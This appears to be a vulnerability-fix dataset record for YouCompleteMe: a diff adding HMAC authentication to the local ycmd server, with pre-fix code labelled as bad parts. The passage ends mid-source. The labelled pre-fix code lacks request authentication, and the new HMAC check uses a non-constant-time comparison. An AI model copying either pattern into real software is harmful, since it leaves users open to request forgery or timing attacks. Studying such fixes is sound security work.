b\/python\/ycm\/server\/hmac_plugin.py\nnew file mode 100644\nindex 00000000..b433b2b0\n--- \/dev\/null\n+++ b\/python\/ycm\/server\/hmac_plugin.py\n@@ -0,0 +1,57 @@\n+#!\/usr\/bin\/env python\n+#\n+# Copyright (C) 2014  Google Inc.\n+#\n+# This file is part of YouCompleteMe.\n+#\n+# YouCompleteMe is free software: you can redistribute it and\/or modify\n+# it under the terms of the GNU General Public License as published by\n+# the Free Software Foundation, either version 3 of the License, or\n+# (at your option) any later version.\n+#\n+# YouCompleteMe is distributed in the hope that it will be useful,\n+# but WITHOUT ANY WARRANTY; without even the implied warranty of\n+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+# GNU General Public License for more details.\n+#\n+# You should have received a copy of the GNU General Public License\n+# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n+\n+import logging\n+import httplib\n+from bottle import request, response, abort\n+from ycm import utils\n+\n+_HMAC_HEADER = 'x-ycm-hmac'\n+\n+# This class implements the Bottle plugin API:\n+# http:\/\/bottlepy.org\/docs\/dev\/plugindev.html\n+#\n+# We want to ensure that every request coming in has a valid HMAC set in the\n+# x-ycm-hmac header and that every response coming out sets such a valid header.\n+# This is to prevent security issues with possible remote code execution.\n+class HmacPlugin( object ):\n+  name = 'hmac'\n+  api = 2\n+\n+\n+  def __init__( self, hmac_secret ):\n+    self._hmac_secret = hmac_secret\n+    self._logger = logging.getLogger( __name__ )\n+\n+\n+  def __call__( self, callback ):\n+    def wrapper( *args, **kwargs ):\n+      body = request.body.read()\n+      if not utils.ContentHexHmacValid( body,\n+                                        request.headers[ _HMAC_HEADER ],\n+                                        self._hmac_secret ):\n+        self._logger.info( 'Dropping request with bad HMAC.' )\n+        abort( httplib.UNAUTHORIZED, 'Unauthorized, received bad HMAC.')\n+        return\n+      body = callback( *args, **kwargs )\n+      response.headers[ _HMAC_HEADER ] = utils.CreateHexHmac(\n+          body, self._hmac_secret )\n+      return body\n+    return wrapper\n+\ndiff --git a\/python\/ycm\/server\/ycmd.py b\/python\/ycm\/server\/ycmd.py\nindex 34e66172..64b0f07f 100755\n--- a\/python\/ycm\/server\/ycmd.py\n+++ b\/python\/ycm\/server\/ycmd.py\n@@ -27,10 +27,12 @@\n import waitress\n import signal\n import os\n+import base64\n from ycm import user_options_store\n from ycm import extra_conf_store\n from ycm import utils\n from ycm.server.watchdog_plugin import WatchdogPlugin\n+from ycm.server.hmac_plugin import HmacPlugin\n \n def YcmCoreSanityCheck():\n   if 'ycm_core' in sys.modules:\n@@ -103,6 +105,8 @@ def Main():\n   options = ( json.load( open( args.options_file, 'r' ) )\n               if args.options_file\n               else user_options_store.DefaultOptions() )\n+  utils.RemoveIfExists( args.options_file )\n+  hmac_secret = base64.b64decode( options[ 'hmac_secret' ] )\n   user_options_store.SetAll( options )\n \n   # This ensures that ycm_core is not loaded before extra conf\n@@ -126,6 +130,7 @@ def Main():\n   handlers.UpdateUserOptions( options )\n   SetUpSignalHandler(args.stdout, args.stderr, args.keep_logfiles)\n   handlers.app.install( WatchdogPlugin( args.idle_suicide_seconds ) )\n+  handlers.app.install( HmacPlugin( hmac_secret ) )\n   waitress.serve( handlers.app,\n                   host = args.host,\n                   port = args.port,\ndiff --git a\/python\/ycm\/utils.py b\/python\/ycm\/utils.py\nindex d9128716..095337c9 100644\n--- a\/python\/ycm\/utils.py\n+++ b\/python\/ycm\/utils.py\n@@ -25,6 +25,8 @@\n import socket\n import stat\n import json\n+import hmac\n+import hashlib\n from distutils.spawn import find_executable\n import subprocess\n import collections\n@@ -212,3 +214,11 @@ def SafePopen( *args, **kwargs ):\n   return subprocess.Popen( *args, **kwargs )\n \n \n+def ContentHexHmacValid( content, hmac, hmac_secret ):\n+  return hmac == CreateHexHmac( content, hmac_secret )\n+\n+\n+def CreateHexHmac( content, hmac_secret ):\n+  return hmac.new( hmac_secret,\n+                   msg = content,\n+                   digestmod = hashlib.sha256 ).hexdigest()\ndiff --git a\/python\/ycm\/youcompleteme.py b\/python\/ycm\/youcompleteme.py\nindex 448236eb..83849ce1 100644\n--- a\/python\/ycm\/youcompleteme.py\n+++ b\/python\/ycm\/youcompleteme.py\n@@ -22,6 +22,7 @@\n import tempfile\n import json\n import signal\n+import base64\n from subprocess import PIPE\n from ycm import vimsupport\n from ycm import utils\n@@ -58,6 +59,7 @@\n # Ctrl-C in Vim.\n signal.signal( signal.SIGINT, signal.SIG_IGN )\n \n+HMAC_SECRET_LENGTH = 16\n NUM_YCMD_STDERR_LINES_ON_CRASH = 30\n SERVER_CRASH_MESSAGE_STDERR_FILE = (\n   'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n@@ -80,16 +82,18 @@ def __init__( self, user_options ):\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n@@ -116,6 +120,7 @@ def _SetupServer( self ):\n \n       self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n       BaseRequest.server_location = 'http:\/\/localhost:' + str( server_port )\n+      BaseRequest.hmac_secret = hmac_secret\n \n     self._NotifyUserIfServerCrashed()\n \n@@ -148,7 +153,6 @@ def ServerPid( self ):\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","files":{"\/python\/ycm\/client\/base_request.py":{"changes":[{"diff":"\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n","add":14,"remove":10,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["        return BaseRequest.session.post( _BuildUri( handler ),","                                        data = ToUtf8Json( data ),","                                        headers = _HEADERS,","                                        timeout = timeout )","        return BaseRequest.session.get( _BuildUri( handler ),","                                        headers = _HEADERS,","                                        timeout = timeout )","                              data = ToUtf8Json( data ),","                              headers = _HEADERS )","                             headers = _HEADERS )"],"goodparts":["        sent_data = ToUtf8Json( data )","        return BaseRequest.session.post(","            _BuildUri( handler ),","            data = sent_data,","            headers = BaseRequest._ExtraHeaders( sent_data ),","            timeout = timeout )","        return BaseRequest.session.get(","            _BuildUri( handler ),","            headers = BaseRequest._ExtraHeaders(),","            timeout = timeout )","        sent_data = ToUtf8Json( data )","                              data = sent_data,","                              headers = BaseRequest._ExtraHeaders( sent_data ) )","                             headers = BaseRequest._ExtraHeaders() )"]},{"diff":"\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ","add":3,"remove":1,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["    response = requests.get( _BuildUri( 'healthy' ) )"],"goodparts":["    response = requests.get( _BuildUri( 'healthy' ),","                             headers = BaseRequest._ExtraHeaders() )","    _ValidateResponseObject( response )"]},{"diff":"\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n","add":14,"remove":10,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["        return BaseRequest.session.post( _BuildUri( handler ),","                                        data = ToUtf8Json( data ),","                                        headers = _HEADERS,","                                        timeout = timeout )","        return BaseRequest.session.get( _BuildUri( handler ),","                                        headers = _HEADERS,","                                        timeout = timeout )","                              data = ToUtf8Json( data ),","                              headers = _HEADERS )","                             headers = _HEADERS )"],"goodparts":["        sent_data = ToUtf8Json( data )","        return BaseRequest.session.post(","            _BuildUri( handler ),","            data = sent_data,","            headers = BaseRequest._ExtraHeaders( sent_data ),","            timeout = timeout )","        return BaseRequest.session.get(","            _BuildUri( handler ),","            headers = BaseRequest._ExtraHeaders(),","            timeout = timeout )","        sent_data = ToUtf8Json( data )","                              data = sent_data,","                              headers = BaseRequest._ExtraHeaders( sent_data ) )","                             headers = BaseRequest._ExtraHeaders() )"]},{"diff":"\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ","add":3,"remove":1,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["    response = requests.get( _BuildUri( 'healthy' ) )"],"goodparts":["    response = requests.get( _BuildUri( 'healthy' ),","                             headers = BaseRequest._ExtraHeaders() )","    _ValidateResponseObject( response )"]}],"source":"\n import vim import requests import urlparse from retries import retries from requests_futures.sessions import FuturesSession from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor from ycm import vimsupport from ycm.utils import ToUtf8Json from ycm.server.responses import ServerError, UnknownExtraConf _HEADERS={'content-type': 'application\/json'} _EXECUTOR=UnsafeThreadPoolExecutor( max_workers=30) _DEFAULT_TIMEOUT_SEC=30 class BaseRequest( object): def __init__( self): pass def Start( self): pass def Done( self): return True def Response( self): return{} @staticmethod def GetDataFromHandler( handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '', handler, 'GET', timeout)) @staticmethod def PostDataToHandler( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data, handler, timeout)) @staticmethod def PostDataToHandlerAsync( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout) @staticmethod def _TalkToHandlerAsync( data, handler, method, timeout=_DEFAULT_TIMEOUT_SEC): def SendRequest( data, handler, method, timeout): if method=='POST': return BaseRequest.session.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS, timeout=timeout) if method=='GET': return BaseRequest.session.get( _BuildUri( handler), headers=_HEADERS, timeout=timeout) @retries( 5, delay=0.5, backoff=1.5) def DelayedSendRequest( data, handler, method): if method=='POST': return requests.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS) if method=='GET': return requests.get( _BuildUri( handler), headers=_HEADERS) if not _CheckServerIsHealthyWithCache(): return _EXECUTOR.submit( DelayedSendRequest, data, handler, method) return SendRequest( data, handler, method, timeout) session=FuturesSession( executor=_EXECUTOR) server_location='http:\/\/localhost:6666' def BuildRequestData( start_column=None, query=None, include_buffer_data=True): line, column=vimsupport.CurrentLineAndColumn() filepath=vimsupport.GetCurrentBufferFilepath() request_data={ 'filetypes': vimsupport.CurrentFiletypes(), 'line_num': line, 'column_num': column, 'start_column': start_column, 'line_value': vim.current.line, 'filepath': filepath } if include_buffer_data: request_data[ 'file_data']=vimsupport.GetUnsavedAndCurrentBufferData() if query: request_data[ 'query']=query return request_data def JsonFromFuture( future): response=future.result() if response.status_code==requests.codes.server_error: _RaiseExceptionForData( response.json()) response.raise_for_status() if response.text: return response.json() return None def _BuildUri( handler): return urlparse.urljoin( BaseRequest.server_location, handler) SERVER_HEALTHY=False def _CheckServerIsHealthyWithCache(): global SERVER_HEALTHY def _ServerIsHealthy(): response=requests.get( _BuildUri( 'healthy')) response.raise_for_status() return response.json() if SERVER_HEALTHY: return True try: SERVER_HEALTHY=_ServerIsHealthy() return SERVER_HEALTHY except: return False def _RaiseExceptionForData( data): if data[ 'exception'][ 'TYPE']==UnknownExtraConf.__name__: raise UnknownExtraConf( data[ 'exception'][ 'extra_conf_file']) raise ServerError( '{0}:{1}'.format( data[ 'exception'][ 'TYPE'], data[ 'message'])) ","sourceWithComments":"#!\/usr\/bin\/env python\n#\n# Copyright (C) 2013  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and\/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nimport vim\nimport requests\nimport urlparse\nfrom retries import retries\nfrom requests_futures.sessions import FuturesSession\nfrom ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\nfrom ycm import vimsupport\nfrom ycm.utils import ToUtf8Json\nfrom ycm.server.responses import ServerError, UnknownExtraConf\n\n_HEADERS = {'content-type': 'application\/json'}\n_EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n# Setting this to None seems to screw up the Requests\/urllib3 libs.\n_DEFAULT_TIMEOUT_SEC = 30\n\nclass BaseRequest( object ):\n  def __init__( self ):\n    pass\n\n\n  def Start( self ):\n    pass\n\n\n  def Done( self ):\n    return True\n\n\n  def Response( self ):\n    return {}\n\n  # This method blocks\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def GetDataFromHandler( handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '',\n                                                            handler,\n                                                            'GET',\n                                                            timeout ) )\n\n\n  # This is the blocking version of the method. See below for async.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandler( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data,\n                                                               handler,\n                                                               timeout ) )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandlerAsync( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |method| is either 'POST' or 'GET'.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def _TalkToHandlerAsync( data,\n                           handler,\n                           method,\n                           timeout = _DEFAULT_TIMEOUT_SEC ):\n    def SendRequest( data, handler, method, timeout ):\n      if method == 'POST':\n        return BaseRequest.session.post( _BuildUri( handler ),\n                                        data = ToUtf8Json( data ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n      if method == 'GET':\n        return BaseRequest.session.get( _BuildUri( handler ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n\n    @retries( 5, delay = 0.5, backoff = 1.5 )\n    def DelayedSendRequest( data, handler, method ):\n      if method == 'POST':\n        return requests.post( _BuildUri( handler ),\n                              data = ToUtf8Json( data ),\n                              headers = _HEADERS )\n      if method == 'GET':\n        return requests.get( _BuildUri( handler ),\n                             headers = _HEADERS )\n\n    if not _CheckServerIsHealthyWithCache():\n      return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n\n    return SendRequest( data, handler, method, timeout )\n\n\n  session = FuturesSession( executor = _EXECUTOR )\n  server_location = 'http:\/\/localhost:6666'\n\n\ndef BuildRequestData( start_column = None,\n                      query = None,\n                      include_buffer_data = True ):\n  line, column = vimsupport.CurrentLineAndColumn()\n  filepath = vimsupport.GetCurrentBufferFilepath()\n  request_data = {\n    'filetypes': vimsupport.CurrentFiletypes(),\n    'line_num': line,\n    'column_num': column,\n    'start_column': start_column,\n    'line_value': vim.current.line,\n    'filepath': filepath\n  }\n\n  if include_buffer_data:\n    request_data[ 'file_data' ] = vimsupport.GetUnsavedAndCurrentBufferData()\n  if query:\n    request_data[ 'query' ] = query\n\n  return request_data\n\n\ndef JsonFromFuture( future ):\n  response = future.result()\n  if response.status_code == requests.codes.server_error:\n    _RaiseExceptionForData( response.json() )\n\n  # We let Requests handle the other status types, we only handle the 500\n  # error code.\n  response.raise_for_status()\n\n  if response.text:\n    return response.json()\n  return None\n\n\ndef _BuildUri( handler ):\n  return urlparse.urljoin( BaseRequest.server_location, handler )\n\n\nSERVER_HEALTHY = False\n\ndef _CheckServerIsHealthyWithCache():\n  global SERVER_HEALTHY\n\n  def _ServerIsHealthy():\n    response = requests.get( _BuildUri( 'healthy' ) )\n    response.raise_for_status()\n    return response.json()\n\n  if SERVER_HEALTHY:\n    return True\n\n  try:\n    SERVER_HEALTHY = _ServerIsHealthy()\n    return SERVER_HEALTHY\n  except:\n    return False\n\n\ndef _RaiseExceptionForData( data ):\n  if data[ 'exception' ][ 'TYPE' ] == UnknownExtraConf.__name__:\n    raise UnknownExtraConf( data[ 'exception' ][ 'extra_conf_file' ] )\n\n  raise ServerError( '{0}: {1}'.format( data[ 'exception' ][ 'TYPE' ],\n                                        data[ 'message' ] ) )\n"},"\/python\/ycm\/youcompleteme.py":{"changes":[{"diff":"\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n","add":5,"remove":3,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    self._temp_options_filename = None","      self._temp_options_filename = options_file.name","      json.dump( dict( self._user_options ), options_file )"],"goodparts":["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )","      options_dict = dict( self._user_options )","      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )","      json.dump( options_dict, options_file )"]},{"diff":"\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","add":0,"remove":1,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    utils.RemoveIfExists( self._temp_options_filename )"],"goodparts":[]},{"diff":"\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n","add":5,"remove":3,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    self._temp_options_filename = None","      self._temp_options_filename = options_file.name","      json.dump( dict( self._user_options ), options_file )"],"goodparts":["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )","      options_dict = dict( self._user_options )","      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )","      json.dump( options_dict, options_file )"]},{"diff":"\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","add":0,"remove":1,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    utils.RemoveIfExists( self._temp_options_filename )"],"goodparts":[]}],"source":"\n import os import vim import tempfile import json import signal from subprocess import PIPE from ycm import vimsupport from ycm import utils from ycm.diagnostic_interface import DiagnosticInterface from ycm.completers.all.omni_completer import OmniCompleter from ycm.completers.general import syntax_parse from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype from ycm.client.ycmd_keepalive import YcmdKeepalive from ycm.client.base_request import BaseRequest, BuildRequestData from ycm.client.command_request import SendCommandRequest from ycm.client.completion_request import CompletionRequest from ycm.client.omni_completion_request import OmniCompletionRequest from ycm.client.event_notification import( SendEventNotificationAsync, EventNotification) from ycm.server.responses import ServerError try: from UltiSnips import UltiSnips_Manager USE_ULTISNIPS_DATA=True except ImportError: USE_ULTISNIPS_DATA=False os.environ['no_proxy']='127.0.0.1,localhost' signal.signal( signal.SIGINT, signal.SIG_IGN) NUM_YCMD_STDERR_LINES_ON_CRASH=30 SERVER_CRASH_MESSAGE_STDERR_FILE=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' + 'Stderr(last{0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH)) SERVER_CRASH_MESSAGE_SAME_STDERR=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' ' check console output for logs!') SERVER_IDLE_SUICIDE_SECONDS=10800 class YouCompleteMe( object): def __init__( self, user_options): self._user_options=user_options self._user_notified_about_crash=False self._diag_interface=DiagnosticInterface( user_options) self._omnicomp=OmniCompleter( user_options) self._latest_completion_request=None self._latest_file_parse_request=None self._server_stdout=None self._server_stderr=None self._server_popen=None self._filetypes_with_keywords_loaded=set() self._temp_options_filename=None self._ycmd_keepalive=YcmdKeepalive() self._SetupServer() self._ycmd_keepalive.Start() def _SetupServer( self): server_port=utils.GetUnusedLocalhostPort() with tempfile.NamedTemporaryFile( delete=False) as options_file: self._temp_options_filename=options_file.name json.dump( dict( self._user_options), options_file) options_file.flush() args=[ utils.PathToPythonInterpreter(), _PathToServerScript(), '--port={0}'.format( server_port), '--options_file={0}'.format( options_file.name), '--log={0}'.format( self._user_options[ 'server_log_level']), '--idle_suicide_seconds={0}'.format( SERVER_IDLE_SUICIDE_SECONDS)] if not self._user_options[ 'server_use_vim_stdout']: filename_format=os.path.join( utils.PathToTempDir(), 'server_{port}_{std}.log') self._server_stdout=filename_format.format( port=server_port, std='stdout') self._server_stderr=filename_format.format( port=server_port, std='stderr') args.append('--stdout={0}'.format( self._server_stdout)) args.append('--stderr={0}'.format( self._server_stderr)) if self._user_options[ 'server_keep_logfiles']: args.append('--keep_logfiles') self._server_popen=utils.SafePopen( args, stdout=PIPE, stderr=PIPE) BaseRequest.server_location='http:\/\/localhost:' +str( server_port) self._NotifyUserIfServerCrashed() def _IsServerAlive( self): returncode=self._server_popen.poll() return returncode is None def _NotifyUserIfServerCrashed( self): if self._user_notified_about_crash or self._IsServerAlive(): return self._user_notified_about_crash=True if self._server_stderr: with open( self._server_stderr, 'r') as server_stderr_file: error_output=''.join( server_stderr_file.readlines()[ : -NUM_YCMD_STDERR_LINES_ON_CRASH]) vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE + error_output) else: vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR) def ServerPid( self): if not self._server_popen: return -1 return self._server_popen.pid def _ServerCleanup( self): if self._IsServerAlive(): self._server_popen.terminate() utils.RemoveIfExists( self._temp_options_filename) def RestartServer( self): vimsupport.PostVimMessage( 'Restarting ycmd server...') self._user_notified_about_crash=False self._ServerCleanup() self._SetupServer() def CreateCompletionRequest( self, force_semantic=False): if( not self.NativeFiletypeCompletionAvailable() and self.CurrentFiletypeCompletionEnabled() and self._omnicomp.ShouldUseNow()): self._latest_completion_request=OmniCompletionRequest( self._omnicomp) else: extra_data={} self._AddExtraConfDataIfNeeded( extra_data) if force_semantic: extra_data[ 'force_semantic']=True self._latest_completion_request=( CompletionRequest( extra_data) if self._IsServerAlive() else None) return self._latest_completion_request def SendCommandRequest( self, arguments, completer): if self._IsServerAlive(): return SendCommandRequest( arguments, completer) def GetDefinedSubcommands( self): if self._IsServerAlive(): return BaseRequest.PostDataToHandler( BuildRequestData(), 'defined_subcommands') else: return[] def GetCurrentCompletionRequest( self): return self._latest_completion_request def GetOmniCompleter( self): return self._omnicomp def NativeFiletypeCompletionAvailable( self): return any([ FiletypeCompleterExistsForFiletype( x) for x in vimsupport.CurrentFiletypes()]) def NativeFiletypeCompletionUsable( self): return( self.CurrentFiletypeCompletionEnabled() and self.NativeFiletypeCompletionAvailable()) def OnFileReadyToParse( self): self._omnicomp.OnFileReadyToParse( None) if not self._IsServerAlive(): self._NotifyUserIfServerCrashed() extra_data={} self._AddTagsFilesIfNeeded( extra_data) self._AddSyntaxDataIfNeeded( extra_data) self._AddExtraConfDataIfNeeded( extra_data) self._latest_file_parse_request=EventNotification( 'FileReadyToParse', extra_data) self._latest_file_parse_request.Start() def OnBufferUnload( self, deleted_buffer_file): if not self._IsServerAlive(): return SendEventNotificationAsync( 'BufferUnload', { 'unloaded_buffer': deleted_buffer_file}) def OnBufferVisit( self): if not self._IsServerAlive(): return extra_data={} _AddUltiSnipsDataIfNeeded( extra_data) SendEventNotificationAsync( 'BufferVisit', extra_data) def OnInsertLeave( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'InsertLeave') def OnCursorMoved( self): self._diag_interface.OnCursorMoved() def OnVimLeave( self): self._ServerCleanup() def OnCurrentIdentifierFinished( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'CurrentIdentifierFinished') def DiagnosticsForCurrentFileReady( self): return bool( self._latest_file_parse_request and self._latest_file_parse_request.Done()) def GetDiagnosticsFromStoredRequest( self, qflist_format=False): if self.DiagnosticsForCurrentFileReady(): diagnostics=self._latest_file_parse_request.Response() self._latest_file_parse_request=None if qflist_format: return vimsupport.ConvertDiagnosticsToQfList( diagnostics) else: return diagnostics return[] def UpdateDiagnosticInterface( self): if not self.DiagnosticsForCurrentFileReady(): return self._diag_interface.UpdateWithNewDiagnostics( self.GetDiagnosticsFromStoredRequest()) def ShowDetailedDiagnostic( self): if not self._IsServerAlive(): return try: debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'detailed_diagnostic') if 'message' in debug_info: vimsupport.EchoText( debug_info[ 'message']) except ServerError as e: vimsupport.PostVimMessage( str( e)) def DebugInfo( self): if self._IsServerAlive(): debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'debug_info') else: debug_info='Server crashed, no debug info from server' debug_info +='\\nServer running at:{0}'.format( BaseRequest.server_location) debug_info 